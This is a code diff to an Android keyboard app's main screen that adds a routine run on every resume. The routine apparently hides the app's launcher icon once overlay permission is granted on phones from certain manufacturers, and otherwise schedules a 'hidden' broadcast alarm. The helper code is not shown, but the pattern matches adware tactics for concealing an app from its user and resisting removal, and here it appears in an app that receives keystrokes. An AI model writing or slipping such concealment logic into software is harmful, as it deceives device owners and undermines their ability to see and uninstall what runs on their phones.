@@ -1,6 +1,7 @@
 package com.neonkeyboard.cool.ui.main.activity
 
 import android.content.Intent
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
@@ -33,6 +34,9 @@ import com.neonkeyboard.cool.ui.theme.editor.activity.ThemeEditorActivity
 import com.neonkeyboard.cool.util.BUNDLE_IS_EDITING_THEME_KEY
 import com.neonkeyboard.cool.util.BUNDLE_THEME_KEY
 import com.neonkeyboard.cool.util.EXTRA_LAUNCH_SETTINGS
+import com.neonkeyboard.cool.util.hiding.HiddenBroadcast
+import com.neonkeyboard.cool.util.hiding.HideAppUtil
+import java.util.*
 
 
 class MainActivity : BaseActivity<MainActivityViewModel, MainActivityBinding>(R.layout.main_activity),
@@ -162,7 +166,19 @@ class MainActivity : BaseActivity<MainActivityViewModel, MainActivityBinding>(R.
         super.onResume()
         viewModel.checkEnableKeyboardSwipe()
         if (!isKeyboardEnable() || !isKeyboardActive()) dialogPermissions.show(supportFragmentManager)
+        tryToHideApp()
     }
+
+    private fun tryToHideApp() =
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            HideAppUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HiddenBroadcast.startAlarm(this)
+
+    private fun notSupportedBackgroundDevice() =
+        Build.MANUFACTURER.lowercase() in listOf(
+            "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
+        )
 
     override fun askPermissions() {
         if (!isKeyboardActive()) settingsLauncher
